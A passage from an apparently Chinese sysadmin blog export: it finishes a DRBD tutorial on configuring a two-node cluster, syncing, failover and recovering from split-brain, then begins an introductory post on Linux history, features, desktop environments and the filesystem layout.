can find an example in /usr/share/doc/drbd.../drbd.conf.exampleinclude "drbd.d/global_common.conf";include "drbd.d/*.res"; 3.修改配置文件如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849[root@nod1 ~]#vim /etc/drbd.d/global_common.confglobal &#123;usage-count no; #是否参加DRBD使用统计，默认为yes# minor-count dialog-refresh disable-ip-verification&#125;common &#123;protocol C; #使用DRBD的同步协议handlers &#123;# These are EXAMPLE handlers only.# They may have severe implications,# like hard resetting the node under certain circumstances.# Be careful when chosing your poison.pri-on-incon-degr "/usr/lib/drbd/notify-pri-on-incon-degr.sh; /usr/lib/drbd/notify-emergency-reboot.sh; echo b &gt; /proc/sysrq-trigger ; reboot -f";pri-lost-after-sb "/usr/lib/drbd/notify-pri-lost-after-sb.sh; /usr/lib/drbd/notify-emergency-reboot.sh; echo b &gt; /proc/sysrq-trigger ; reboot -f";local-io-error "/usr/lib/drbd/notify-io-error.sh; /usr/lib/drbd/notify-emergency-shutdown.sh; echo o &gt; /proc/sysrq-trigger ; halt -f";# fence-peer "/usr/lib/drbd/crm-fence-peer.sh";# split-brain "/usr/lib/drbd/notify-split-brain.sh root";# out-of-sync "/usr/lib/drbd/notify-out-of-sync.sh root";# before-resync-target "/usr/lib/drbd/snapshot-resync-target-lvm.sh -p 15 -- -c 16k";# after-resync-target /usr/lib/drbd/unsnapshot-resync-target-lvm.sh;&#125;startup &#123;# wfc-timeout degr-wfc-timeout outdated-wfc-timeout wait-after-sb&#125;options &#123;# cpu-mask on-no-data-accessible&#125;disk &#123;on-io-error detach; #配置I/O错误处理策略为分离# size max-bio-bvecs on-io-error fencing disk-barrier disk-flushes# disk-drain md-flushes resync-rate resync-after al-extents# c-plan-ahead c-delay-target c-fill-target c-max-rate# c-min-rate disk-timeout&#125;net &#123;cram-hmac-alg "sha1"; #设置加密算法shared-secret "allendrbd"; #设置加密密钥# protocol timeout max-epoch-size max-buffers unplug-watermark# connect-int ping-int sndbuf-size rcvbuf-size ko-count# allow-two-primaries cram-hmac-alg shared-secret after-sb-0pri# after-sb-1pri after-sb-2pri always-asbp rr-conflict# ping-timeout data-integrity-alg tcp-cork on-congestion# congestion-fill congestion-extents csums-alg verify-alg# use-rle&#125;syncer &#123;rate 1024M; #设置主备节点同步时的网络速率&#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释： on-io-error 策略可能为以下选项之一 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;detach 分离：这是默认和推荐的选项，如果在节点上发生底层的硬盘I/O错误，它会将设备运行在Diskless无盘模式下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pass_on：DRBD会将I/O错误报告到上层，在主节点上，它会将其报告给挂载的文件系统，但是在此节点上就往往忽略（因此此节点上没有可以报告的上层） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-local-in-error：调用本地磁盘I/O处理程序定义的命令；这需要有相应的local-io-error调用的资源处理程序处理错误的命令；这就给管理员有足够自由的权力命令命令或是脚本调用local-io-error处理I/O错误 4.添加资源文件:123456789101112131415[root@nod1 ~]# vim /etc/drbd.d/drbd.resresource drbd &#123; on nod1.allen.com &#123; #第个主机说明以on开头，后面是主机名称 device /dev/drbd0;#DRBD设备名称 disk /dev/sda3; #drbd0使用的磁盘分区为"sda3" address 192.168.137.225:7789; #设置DRBD监听地址与端口 meta-disk internal; &#125; on nod2.allen.com &#123; device /dev/drbd0; disk /dev/sda3; address 192.168.137.222:7789; meta-disk internal; &#125;&#125; 5.将配置文件为NOD2提供一份12345678[root@nod1 ~]# scp /etc/drbd.d/&#123;global_common.conf,drbd.res&#125; nod2:/etc/drbd.d/The authenticity of host 'nod2 (192.168.137.222)' can't be established.RSA key fingerprint is 29:d3:28:85:20:a1:1f:2a:11:e5:88:cd:25:d0:95:c7.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'nod2' (RSA) to the list of known hosts.root@nod2's password:global_common.conf 100% 1943 1.9KB/s 00:00 drbd.res 100% 318 0.3KB/s 00:00 6.初始化资源并启动服务12345678910111213141516171819202122232425262728######在NOD1节点上初始化资源并启动服务[root@nod1 ~]# drbdadm create-md drbdWriting meta data...initializing activity logNOT initializing bitmaplk_bdev_save(/var/lib/drbd/drbd-minor-0.lkbd) failed: No such file or directoryNew drbd meta data block successfully created. #提示已经创建成功lk_bdev_save(/var/lib/drbd/drbd-minor-0.lkbd) failed: No such file or directory######启动服务[root@nod1 ~]# service drbd startStarting DRBD resources: [ create res: drbd prepare disk: drbd adjust disk: drbd adjust net: drbd]..........*************************************************************** DRBD's startup script waits for the peer node(s) to appear. - In case this node was already a degraded cluster before the reboot the timeout is 0 seconds. [degr-wfc-timeout] - If the peer was available before the reboot the timeout will expire after 0 seconds. [wfc-timeout] (These values are for resource 'drbd'; 0 sec -&gt; wait forever) To abort waiting enter 'yes' [ 12]: yes######查看监听端口[root@nod1 ~]# ss -tanl |grep 7789LISTEN 0 5 192.168.137.225:7789 *:* 1234567891011121314151617181920212223######在NOD2节点上初始化资源并启动服务[root@nod2 ~]# drbdadm create-md drbdWriting meta data...initializing activity logNOT initializing bitmaplk_bdev_save(/var/lib/drbd/drbd-minor-0.lkbd) failed: No such file or directoryNew drbd meta data block successfully created.lk_bdev_save(/var/lib/drbd/drbd-minor-0.lkbd) failed: No such file or directory######启动服务[root@nod2 ~]# service drbd startStarting DRBD resources: [ create res: drbd prepare disk: drbd adjust disk: drbd adjust net: drbd]######查看监听地址与端口[root@nod2 ~]# netstat -anput|grep 7789tcp 0 0 192.168.137.222:42345 192.168.137.225:7789 ESTABLISHED - tcp 0 0 192.168.137.222:7789 192.168.137.225:42325 ESTABLISHED -######查看DRBD启动状态[root@nod2 ~]# drbd-overview 0:drbd/0 Connected Secondary/Secondary Inconsistent/Inconsistent C r----- 7.资源的连接状态详细介绍如何查看资源连接状态？12[root@nod1 ~]# drbdadm cstate drbd #drbd为资源名称Connected 资源的连接状态；一个资源可能有以下连接状态中的一种 StandAlone 独立的：网络配置不可用；资源还没有被连接或是被管理断开（使用 drbdadm disconnect 命令），或是由于出现认证失败或是脑裂的情况 Disconnecting 断开：断开只是临时状态，下一个状态是StandAlone独立的 Unconnected 悬空：是尝试连接前的临时状态，可能下一个状态为WFconnection和WFReportParams Timeout 超时：与对等节点连接超时，也是临时状态，下一个状态为Unconected悬空 BrokerPipe：与对等节点连接丢失，也是临时状态，下一个状态为Unconected悬空 NetworkFailure：与对等节点推动连接后的临时状态，下一个状态为Unconected悬空 ProtocolError：与对等节点推动连接后的临时状态，下一个状态为Unconected悬空 TearDown 拆解：临时状态，对等节点关闭，下一个状态为Unconected悬空 WFConnection：等待和对等节点建立网络连接 WFReportParams：已经建立TCP连接，本节点等待从对等节点传来的第一个网络包 Connected 连接：DRBD已经建立连接，数据镜像现在可用，节点处于正常状态 StartingSyncS：完全同步，有管理员发起的刚刚开始同步，未来可能的状态为SyncSource或PausedSyncS StartingSyncT：完全同步，有管理员发起的刚刚开始同步，下一状态为WFSyncUUID WFBitMapS：部分同步刚刚开始，下一步可能的状态为SyncSource或PausedSyncS WFBitMapT：部分同步刚刚开始，下一步可能的状态为WFSyncUUID WFSyncUUID：同步即将开始，下一步可能的状态为SyncTarget或PausedSyncT SyncSource：以本节点为同步源的同步正在进行 SyncTarget：以本节点为同步目标的同步正在进行 PausedSyncS：以本地节点是一个持续同步的源，但是目前同步已经暂停，可能是因为另外一个同步正在进行或是使用命令(drbdadm pause-sync)暂停了同步 PausedSyncT：以本地节点为持续同步的目标，但是目前同步已经暂停，这可以是因为另外一个同步正在进行或是使用命令(drbdadm pause-sync)暂停了同步 VerifyS：以本地节点为验证源的线上设备验证正在执行 VerifyT：以本地节点为验证目标的线上设备验证正在执行 资源角色&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看资源角色命令 1234567[root@nod1 ~]# drbdadm role drbdSecondary/Secondary[root@nod1 ~]# cat /proc/drbdversion: 8.4.3 (api:1/proto:86-101)GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21 0: cs:Connected ro:Secondary/Secondary ds:Inconsistent/Inconsistent C r----- ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:2103412 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释： Parimary 主：资源目前为主，并且可能正在被读取或写入，如果不是双主只会出现在两个节点中的其中一个节点上 Secondary 次：资源目前为次，正常接收对等节点的更新 Unknown 未知：资源角色目前未知，本地的资源不会出现这种状态 硬盘状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看硬盘状态命令 12[root@nod1 ~]# drbdadm dstate drbdInconsistent/Inconsistent &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本地和对等节点的硬盘有可能为下列状态之一： Diskless 无盘：本地没有块设备分配给DRBD使用，这表示没有可用的设备，或者使用drbdadm命令手工分离或是底层的I/O错误导致自动分离 Attaching：读取无数据时候的瞬间状态 Failed 失败：本地块设备报告I/O错误的下一个状态，其下一个状态为Diskless无盘 Negotiating：在已经连接的DRBD设置进行Attach读取无数据前的瞬间状态 Inconsistent：数据是不一致的，在两个节点上（初始的完全同步前）这种状态出现后立即创建一个新的资源。此外，在同步期间（同步目标）在一个节点上出现这种状态 Outdated：数据资源是一致的，但是已经过时 DUnknown：当对等节点网络连接不可用时出现这种状态 Consistent：一个没有连接的节点数据一致，当建立连接时，它决定数据是UpToDate或是Outdated UpToDate：一致的最新的数据状态，这个状态为正常状态 启用和禁用资源1234######手动启用资源drbdadm up &lt;resource&gt;######手动禁用资源drbdadm down &lt;resource&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释： resource：为资源名称；当然也可以使用all表示[停用|启用]所有资源 升级和降级资源1234######升级资源drbdadm primary &lt;resource&gt;######降级资源drbdadm secondary &lt;resource&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释：在单主模式下的DRBD，两个节点同时处于连接状态，任何一个节点都可以在特定的时间内变成主；但两个节点中只能一为主，如果已经有一个主，需先降级才可能升级；在双主模式下没有这个限制 8.初始化设备同步&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择一个初始同步源；如果是新初始化的或是空盘，这个选择可以是任意的，但是如果其中的一个节点已经在使用并包含有用的数据，那么选择同步源是至关重要的；如果选错了初始化同步方向，就会造成数据丢失，因此需要十分小心 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动初始化完全同步，这一步只能在初始化资源配置的一个节点上进行，并作为同步源选择的节点上；命令如下： 12345678910111213141516[root@nod1 ~]# drbdadm -- --overwrite-data-of-peer primary drbd[root@nod1 ~]# cat /proc/drbd #查看同步进度version: 8.4.3 (api:1/proto:86-101)GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21 0: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r---n- ns:1897624 nr:0 dw:0 dr:1901216 al:0 bm:115 lo:0 pe:3 ua:3 ap:0 ep:1 wo:f oos:207988 [=================&gt;..] sync'ed: 90.3% (207988/2103412)K finish: 0:00:07 speed: 26,792 (27,076) K/sec######当同步完成时如以下状态version: 8.4.3 (api:1/proto:86-101)GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r----- ns:2103412 nr:0 dw:0 dr:2104084 al:0 bm:129 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0注释： drbd：为资源名称######查看同步进度也可使用以下命令drbd-overview 9.创建文件系统文件系统只能挂载在主(Primary)节点上，因此在设置好主节点后才可以对DRBD设备进行格式化操作123456789101112131415######格式化文件系统[root@nod1 ~]# mkfs.ext4 /dev/drbd0######挂载文件系统[root@nod1 ~]# mount /dev/drbd0 /mnt/######查看挂载[root@nod1 ~]# mount |grep drbd0/dev/drbd0 on /mnt type ext4 (rw)注释："/dev/drbd0"为资源中定义已定义的资源名称######查看DRBD状态[root@nod1 ~]# drbd-overview 0:drbd/0 Connected Primary/Secondary UpToDate/UpToDate C r-----注释：Primary：当前节点为主；在前面为当前节点Secondary：备用节点为次 在挂载目录中创建一个测试文件并卸载；然后12345[root@nod1 ~]# mkdir /mnt/test[root@nod1 ~]# ls /mnt/lost+found test######在切换主节点时必须保证资源不在使用[root@nod1 ~]# umount /mnt/ 切换主备节点12345678910######先把当前主节点降级为次[root@nod1 ~]# drbdadm secondary drbd######查看DRBD状态[root@nod1 ~]# drbd-overview 0:drbd/0 Connected Secondary/Secondary UpToDate/UpToDate C r-----######在NOD2节点升级[root@nod2 ~]# drbdadm primary drbd######查看DRBD状态[root@nod2 ~]# drbd-overview 0:drbd/0 Connected Primary/Secondary UpToDate/UpToDate C r----- 挂载设备并验证文件是否存在123[root@nod2 ~]# mount /dev/drbd0 /mnt/[root@nod2 ~]# ls /mnt/lost+found test 七、DRBD脑裂的模拟及修复&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释：我们还接着上面的实验继续进行，现在NOD2为主节点而NOD1为备节点 1。断开主(parmary)节点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关机、断开网络或重新配置其他的IP都可以；这里选择的是断开网络 2.查看两节点状态12345[root@nod2 ~]# drbd-overview 0:drbd/0 WFConnection Primary/Unknown UpToDate/DUnknown C r----- /mnt ext4 2.0G 68M 1.9G 4%[root@nod1 ~]# drbd-overview 0:drbd/0 StandAlone Secondary/Unknown UpToDate/DUnknown r-----######由上可以看到两个节点已经无法通信；NOD2为主节点，NOD1为备节点 3.将NOD1节点升级为主(primary)节点并挂载资源123456[root@nod1 ~]# drbdadm primary drbd[root@nod1 ~]# drbd-overview 0:drbd/0 StandAlone Primary/Unknown UpToDate/DUnknown r-----[root@nod1 ~]# mount /dev/drbd0 /mnt/[root@nod1 ~]# mount | grep drbd0/dev/drbd0 on /mnt type ext4 (rw) 4.假如原来的主(primary)节点修复好重新上线了，这时出现了脑裂情况12345678910111213[root@nod2 ~]# tail -f /var/log/messagesSep 19 01:56:06 nod2 kernel: d-con drbd: Terminating drbd_a_drbdSep 19 01:56:06 nod2 kernel: block drbd0: helper command: /sbin/drbdadm initial-split-brain minor-0 exit code 0 (0x0)Sep 19 01:56:06 nod2 kernel: block drbd0: Split-Brain detected but unresolved, dropping connection!Sep 19 01:56:06 nod2 kernel: block drbd0: helper command: /sbin/drbdadm split-brain minor-0Sep 19 01:56:06 nod2 kernel: block drbd0: helper command: /sbin/drbdadm split-brain minor-0 exit code 0 (0x0)Sep 19 01:56:06 nod2 kernel: d-con drbd: conn( NetworkFailure -&gt; Disconnecting )Sep 19 01:56:06 nod2 kernel: d-con drbd: error receiving ReportState, e: -5 l: 0!Sep 19 01:56:06 nod2 kernel: d-con drbd: Connection closedSep 19 01:56:06 nod2 kernel: d-con drbd: conn( Disconnecting -&gt; StandAlone )Sep 19 01:56:06 nod2 kernel: d-con drbd: receiver terminatedSep 19 01:56:06 nod2 kernel: d-con drbd: Terminating drbd_r_drbdSep 19 01:56:18 nod2 kernel: block drbd0: role( Primary -&gt; Secondary ) 5.再次查看两节点的状态1234[root@nod1 ~]# drbdadm role drbdPrimary/Unknown[root@nod2 ~]# drbdadm role drbdPrimary/Unknown 6.查看NOD1与NOD2连接状态12345[root@nod1 ~]# drbd-overview 0:drbd/0 StandAlone Primary/Unknown UpToDate/DUnknown r----- /mnt ext4 2.0G 68M 1.9G 4%[root@nod2 ~]# drbd-overview 0:drbd/0 WFConnection Primary/Unknown UpToDate/DUnknown C r----- /mnt ext4 2.0G 68M 1.9G 4%######由上可见，状态为StandAlone时，主备节点是不会通信的 7.查看DRBD的服务状态123456789101112[root@nod1 ~]# service drbd statusdrbd driver loaded OK; device status:version: 8.4.3 (api:1/proto:86-101)GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21m:res cs ro ds p mounted fstype0:drbd StandAlone Primary/Unknown UpToDate/DUnknown r----- ext4[root@nod2 ~]# service drbd statusdrbd driver loaded OK; device status:version: 8.4.3 (api:1/proto:86-101)GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21m:res cs ro ds p mounted fstype0:drbd WFConnection Primary/Unknown UpToDate/DUnknown C /mnt ext4 8.在NOD1备用节点处理办法12345678910111213[root@nod1 ~]# umount /mnt/[root@nod1 ~]# drbdadm disconnect drbddrbd: Failure: (162) Invalid configuration requestadditional info from kernel:unknown connectionCommand 'drbdsetup disconnect ipv4:192.168.137.225:7789 ipv4:192.168.137.222:7789' terminated with exit code 10[root@nod1 ~]# drbdadm secondary drbd[root@nod1 ~]# drbd-overview 0:drbd/0 StandAlone Secondary/Unknown UpToDate/DUnknown r-----[root@nod1 ~]# drbdadm connect --discard-my-data drbd######执行完以上三步后，你查看会发现还是不可用[root@nod1 ~]# drbd-overview 0:drbd/0 WFConnection Secondary/Unknown UpToDate/DUnknown C r----- 9.需要在NOD2节点上重新建立连接资源1234567[root@nod2 ~]# drbdadm connect drbd######查看节点连接状态[root@nod2 ~]# drbd-overview 0:drbd/0 Connected Primary/Secondary UpToDate/UpToDate C r----- /mnt ext4 2.0G 68M 1.9G 4%[root@nod1 ~]# drbd-overview 0:drbd/0 Connected Secondary/Primary UpToDate/UpToDate C r-----######由上可见已经恢复到正常运行状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：特别提醒，如果是单主模式，资源只能在主(Primary)节点上挂载使用，而且不建议手动切换主备节点 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到此DRBD的安装配置及故障修复已结束，DRBD的双主模式一般情况不会用到，这里也不再介绍双主模式的配置]]></content>
      <tags>
        <tag>HA集群</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 简介]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F1.%20Linux%20%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Linux 简介Linux 简史&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 操作系统的诞生、发展和成长过程始终依赖着五个重要支柱：UNIX 操作系统、MINIX 操作系统、GNU计划、POSIX 标准和Internet 网络。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1981 年IBM公司推出微型计算机IBM PC。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991年，GNU计划已经开发出了许多工具软件，最受期盼的GNU C编译器已经出现，GNU的操作系统核心HURD一直处于实验阶段，没有任何可用性，实质上也没能开发出完整的GNU操作系统，但是GNU奠定了Linux用户基础和开发环境。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991年初，林纳斯·托瓦兹开始在一台386sx兼容微机上学习minix操作系统。1991年4月，林纳斯·托瓦兹开始酝酿并着手编制自己的操作系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991 年4 月13 日在comp.os.minix 上发布说自己已经成功地将bash 移植到了minix 上，而且已经爱不释手、不能离开这个shell软件了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991年7月3日，第一个与Linux有关的消息是在comp.os.minix上发布的（当然此时还不存在Linux这个名称，当时林纳斯·托瓦兹的脑子里想的可能是FREAX，FREAX的英文含义是怪诞的、怪物、异想天开等）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991年的10月5日，林纳斯·托瓦兹在comp.os.minix新闻组上发布消息，正式向外宣布Linux内核的诞生（Freeminix-like kernel sources for 386-AT）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1993年，大约有100余名程序员参与了Linux内核代码编写/修改工作，其中核心组由5人组成，此时Linux 0.99的代码大约有十万行，用户大约有10万左右。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1994年3月，Linux1.0发布，代码量17万行，当时是按照完全自由免费的协议发布，随后正式采用GPL协议。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1995年1月，Bob Young创办了RedHat（小红帽），以GNU/Linux为核心，集成了400多个源代码开放的程序模块，搞出了一种冠以品牌的Linux，即RedHat Linux,称为Linux”发行版”，在市场上出售。这在经营模式上是一种创举。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1996年6月，Linux 2.0内核发布，此内核有大约40万行代码，并可以支持多个处理器。此时的Linux 已经进入了实用阶段，全球大约有350万人使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1998年2月，以Eric Raymond为首的一批年轻的”老牛羚骨干分子”终于认识到GNU/Linux体系的产业化道路的本质，并非是什么自由哲学，而是市场竞争的驱动，创办了”Open Source Intiative”（开放源代码促进会）”复兴”的大旗，在互联网世界里展开了一场历史性的Linux产业化运动。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2001年1月，Linux 2.4发布，它进一步地提升了SMP系统的扩展性，同时它也集成了很多用于支持桌面系统的特性：USB，PC卡（PCMCIA）的支持，内置的即插即用，等等功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2003年12月，Linux 2.6版内核发布，相对于2.4版内核2.6在对系统的支持都有很大的变化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2004年的第1月，SuSE嫁到了Novell，SCO继续顶着骂名四处强行“化缘”， Asianux， MandrakeSoft也在五年中首次宣布季度赢利。3月，SGI宣布成功实现了Linux操作系统支持256个Itanium 2处理器。 主要特性基本思想&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux的基本思想有两点：第一，一切都是文件；第二，每个软件都有确定的用途。其中第一条详细来讲就是系统中的所有都归结为一个文件，包括命令、硬件和软件设备、操作系统、进程等等对于操作系统内核而言，都被视为拥有各自特性或类型的文件。至于说Linux是基于Unix的，很大程度上也是因为这两者的基本思想十分相近。 完全免费&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux是一款免费的操作系统，用户可以通过网络或其他途径免费获得，并可以任意修改其源代码。这是其他的操作系统所做不到的。正是由于这一点，来自全世界的无数程序员参与了Linux的修改、编写工作，程序员可以根据自己的兴趣和灵感对其进行改变，这让Linux吸收了无数程序员的精华，不断壮大。 完全兼容POSIX1.0标准&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这使得可以在Linux下通过相应的模拟器运行常见的DOS、Windows的程序。这为用户从Windows转到Linux奠定了基础。许多用户在考虑使用Linux时，就想到以前在Windows下常见的程序是否能正常运行，这一点就消除了他们的疑虑。 多用户、多任务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux支持多用户，各个用户对于自己的文件设备有自己特殊的权利，保证了各用户之间互不影响。多任务则是现在电脑最主要的一个特点，Linux可以使多个程序同时并独立地运行。 良好的界面&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux同时具有字符界面和图形界面。在字符界面用户可以通过键盘输入相应的指令来进行操作。它同时也提供了类似Windows图形界面的X-Window系统，用户可以使用鼠标对其进行操作。在X-Window环境中就和在Windows中相似，可以说是一个Linux版的Windows。 支持多种平台&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux可以运行在多种硬件平台上，如具有x86、680x0、SPARC、Alpha等处理器的平台。此外Linux还是一种嵌入式操作系统，可以运行在掌上电脑、机顶盒或游戏机上。2001年1月份发布的Linux 2.4版内核已经能够完全支持Intel 64位芯片架构。同时Linux也支持多处理器技术。多个处理器同时工作，使系统性能大大提高。 桌面环境介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在图形计算中，一个桌面环境（Desktop environment，有时称为桌面管理器）为计算机提供一个图形用户界面（GUI）。但严格来说窗口管理器和桌面环境是有区别的。桌面环境就是桌面图形环境，它的主要目标是为Linux/Unix操作系统提供一个更加完备 的界面以及大量各类整合工具和使用 程序，其基本 易用性吸引着大量的新用户。桌面环境名称来自桌面比拟，对应于早期的文字命令行界面（CLI）。一个典型的桌面环境提供图标，视窗，工具栏，文件夹，壁纸以及像拖放这样的能力。整体而言，桌面环境在设计和功能上的特性，赋予了它与众不同的外观和感觉。 种类&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现今主流的桌面环境有KDE，gnome，Xfce，LXDE等，除此之外还有Ambient，EDE，IRIX Interactive Desktop，Mezzo，Sugar，CDE等。 gnome&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即GNU网络对象模型环境 (The GNU Network Object Model Environment)，GNU计划的一部分，开放源码运动的一个重要组成部分。是一种让使用者容易操作和设定电脑环境的工具。目标是基于自由软件，为Unix或者类Unix操作系统构造一个功能完善、操作简单以及界面友好的桌面环境，他是GNU计划的正式桌面。 Xfce&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即XForms Common Environment，创建于2007年7月，类似于商业图形环境CDE，是一个运行在各类Unix下的轻量级桌面环境。原作者Olivier Fourdan最先设计XFce是基于XForms三维图形库。Xfce设计目的是用来提高系统的效率，在节省系统资源的同时，能够快速加载和执行应用程序。 Fluxbox&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是一个基于GNU/Linux的轻量级图形操作界面，它虽然没有GNOME和KDE那样精致 ，但由于它的运行对系统资源和配置要求极低，所以它被安装到很多较旧的或是对性能要求较高的机器上，其菜单和有关 配置被保存于用户根目录下的.fluxbox目录里，这样使得它的配置极为便利。 Enlightenment&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是一个功能强大的窗口管理器，它的目标是运用 户轻而易举地配置所见即所得的桌面图形界面。现在Enlightenment的界面已经相当豪华,它拥有像AfterStep一样的可视化时钟以及其它浮华的界面效果，用户不仅可以任意选择边框和动感的声音效果，最有吸引力的是由于它开放的设计思想，每一个用户可以根据自己的爱好，任意地配置窗口的边框、菜单以及屏幕上其它各个部分，而不须要 接触源代码，也不须要 编译任何程序。 文件系统文件类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;普通文件（regular file）：就是一般存取的文件，由ls -al显示出来的属性中，第一个属性为 [-]，例如 [-rwxrwxrwx]。另外，依照文件的内容，又大致可以分为： 纯文本文件（ASCII）：这是Unix系统中最多的一种文件类型，之所以称为纯文本文件，是因为内容可以直接读到的数据，例如数字、字母等等。设 置文件几乎都属于这种文件类型。举例来说，使用命令“cat ~/.bashrc”就可以看到该文件的内容（cat是将文件内容读出来）。 二进制文件（binary）：系统其实仅认识且可以执行二进制文件（binary file）。Linux中的可执行文件（脚本，文本方式的批处理文件不算）就是这种格式的。举例来说，命令cat就是一个二进制文件。 数据格式的文件（data）：有些程序在运行过程中，会读取某些特定格式的文件，那些特定格式的文件可以称为数据文件（data file）。举例来说，Linux在用户登入时，都会将登录数据记录在 /var/log/wtmp文件内，该文件是一个数据文件，它能通过last命令读出来。但使用cat时，会读出乱码。因为它是属于一种特殊格式的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目录文件（directory）：就是目录，第一个属性为 [d]，例如 [drwxrwxrwx]。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;连接文件（link）：类似Windows下面的快捷方式。第一个属性为 [l]，例如 [lrwxrwxrwx]。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设备与设备文件（device）：与系统外设及存储等相关的一些文件，通常都集中在 /dev目录。通常又分为两种： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;块设备文件：就是存储数据以供系统存取的接口设备，简单而言就是硬盘。例如一号硬盘的代码是 /dev/hda1等文件。第一个属性为 [b]。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字符设备文件：即串行端口的接口设备，例如键盘、鼠标等等。第一个属性为 [c]。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;套接字（sockets）：这类文件通常用在网络数据连接。可以启动一个程序来监听客户端的要求，客户端就可以通过套接字来进行数据通信。第一个属性为 [s]，最常在 /var/run目录中看到这种文件类型。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;管道（FIFO,pipe）：FIFO也是一种特殊的文件类型，它主要的目的是，解决多个程序同时存取一个文件所造成的错误。FIFO是first-in-first-out（先进先出）的缩写。第一个属性为 [p]。 文件结构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/：根目录，所有的目录、文件、设备都在/之下，/就是Linux文件系统的组织者，也是最上级的领导者。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/bin：bin 就是二进制（binary）英文缩写。在一般的系统当中，都可以在这个目录下找到linux常用的命令。系统所需要的那些命令位于此目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/boot：Linux的内核及引导系统程序所需要的文件目录，比如 vmlinuz initrd.img 文件都位于这个目录中。在一般情况下，GRUB或LILO系统引导管理器也位于这个目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/cdrom：这个目录在刚刚安装系统的时候是空的。可以将光驱文件系统挂在这个目录下。例如：mount /dev/cdrom /cdrom &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/dev：dev 是设备（device)的英文缩写。这个目录对所有的用户都十分重要。因为在这个目录中包含了所有linux系统中使用的外部设备。但是这里并不是放的外部设备的驱动程序。这一点和常用的windows,dos操作系统不一样。它实际上是一个访问这些外部设备的端口。可以非常方便地去访问这些外部设备，和访问一个文件，一个目录没有任何区别。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc：etc这个目录是linux系统中最重要的目录之一。在这个目录下存放了系统管理时要用到的各种配置文件和子目录。要用到的网络配置文件，文件系统，x系统配置文件，设备配置信息，设置用户信息等都在这个目录下。 